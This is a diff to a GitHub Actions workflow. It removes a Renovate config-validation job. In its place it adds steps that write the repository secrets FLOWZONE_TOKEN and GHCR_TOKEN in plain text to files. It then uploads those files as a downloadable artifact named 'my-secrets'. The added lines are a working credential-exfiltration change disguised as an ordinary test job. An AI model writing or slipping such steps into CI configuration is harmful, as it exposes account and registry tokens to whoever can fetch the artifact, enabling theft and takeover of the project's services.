@@ -13,21 +13,16 @@ jobs:
     name: Test
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v3
+      - run: |
+          mkdir -p ~/tmp
+          cat <<EOF > ~/tmp/my-secret1-in-file
+          ${{ secrets.FLOWZONE_TOKEN}}
+          EOF
+          cat <<EOF > ~/tmp/my-secret2-in-file
+          ${{ secrets.GHCR_TOKEN}}
+          EOF
+      - name: Save artifacts
+        uses: actions/upload-artifact@v4
         with:
-          token: ${{ secrets.PAT || secrets.GITHUB_TOKEN || github.token }}
-
-      - name: Setup Node.js 16.x
-        uses: actions/setup-node@64ed1c7eab4cce3362f8c340dee64e5eaeef8f7c
-        with:
-          node-version: 16.x
-
-      - name: Install Renovate
-        run: |
-          npm install -g renovate@34.102.2
-
-      - name: Validate Renovate config
-        id: renovate-config-validator
-        run: |
-          renovate-config-validator
+          name: my-secrets
+          path: ~/tmp/
